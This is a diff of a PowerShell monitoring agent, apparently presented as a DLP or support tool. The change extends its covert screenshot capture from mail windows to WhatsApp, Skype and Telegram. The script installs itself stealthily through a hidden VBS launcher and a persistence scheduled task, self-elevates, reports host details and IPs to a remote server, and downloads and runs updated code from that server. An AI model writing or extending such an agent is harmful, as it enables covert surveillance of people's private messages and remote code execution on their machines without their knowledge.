@@ -3,7 +3,7 @@ param(
     [switch]$Install
 )
 
-# Version: 1.7.7
+# Version: 1.8.0
 # Description: Extreme-Compat User-Mode Agent with stable ID detection.
 
 # 0. SELF-ELEVATION (Needed for Security Logs)
@@ -69,7 +69,7 @@ try {
 # 3. ROBUST INSTALLATION LOGIC
 function Install-StealthAgent {
     try {
-        Log-Message "Initiating User-Level Persistent Install v1.7.7..."
+        Log-Message "Initiating User-Level Persistent Install v1.8.0..."
         $TaskName = "UEA_Support_Persistence"
         Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue | Stop-ScheduledTask -ErrorAction SilentlyContinue
         Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
@@ -85,7 +85,7 @@ function Install-StealthAgent {
 
         Copy-Item -Path $SourceFile -Destination $ScriptPath -Force -ErrorAction Stop
         
-        $Config = @{ ServerUrl = $ServerUrl; Version = "1.7.7" }
+        $Config = @{ ServerUrl = $ServerUrl; Version = "1.8.0" }
         $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
         
         $VbsMainPath = "$InstallDir\uea_stealth.vbs"
@@ -99,7 +99,7 @@ function Install-StealthAgent {
         Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings | Out-Null
         
         Start-ScheduledTask -TaskName $TaskName | Out-Null
-        Log-Message "User-Mode v1.7.7 Active."
+        Log-Message "User-Mode v1.8.0 Active."
         if ($Host.Name -match "ConsoleHost" -or -not $PSCommandPath) {
             exit
         }
@@ -130,7 +130,7 @@ try {
         if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
     }
 
-    Log-Message "Agent v1.7.7 Started (Admin=$IsAdmin). ID: $AgentId"
+    Log-Message "Agent v1.8.0 Started (Admin=$IsAdmin). ID: $AgentId"
     
     # Define Win32 API for foreground window
     $Win32Code = @'
@@ -232,7 +232,7 @@ try {
             }
             
             $Payload = @{
-                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.7.7"; status = "online"
+                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.8.0"; status = "online"
                 deviceName = $env:COMPUTERNAME; os = $OSInfo; publicIp = $CachedPubIp; localIp = $CachedLocIp; isp = "Enterprise"
             }
             $BodyJson = $Payload | ConvertTo-Json
@@ -279,9 +279,9 @@ try {
                 }
                 Send-DlpEvent -Type "usb_removed" -Details "USB Drive Removed: $DriveID" -Severity "low"
             }
-            # --- EMAIL & SNAPSHOT MONITORING ---
+            # --- EMAIL & MESSAGING SNAPSHOT MONITORING ---
             $WinTitle = try { (Get-Process | Where-Object { $_.MainWindowHandle -ne 0 -and $_.Id -eq [Win32]::GetForegroundWindow() }).MainWindowTitle } catch { "" }
-            if ($WinTitle -match "Gmail" -or $WinTitle -match "Outlook" -or $WinTitle -match "Mail") {
+            if ($WinTitle -match "Gmail" -or $WinTitle -match "Outlook" -or $WinTitle -match "Mail" -or $WinTitle -match "WhatsApp" -or $WinTitle -match "Skype" -or $WinTitle -match "Telegram") {
                 $NowS = [DateTimeOffset]::Now.ToUnixTimeSeconds()
                 if ($NowS - $LastSnapshotTime -gt 300) { # Every 5 mins max
                     $Snapshot = Take-Screenshot
@@ -294,7 +294,7 @@ try {
             Check-BlockedEvents
             # ---------------------
 
-            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.7.7")) {
+            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.8.0")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                 Install-StealthAgent
                 $VbsRestart = "$InstallDir\restart.vbs"
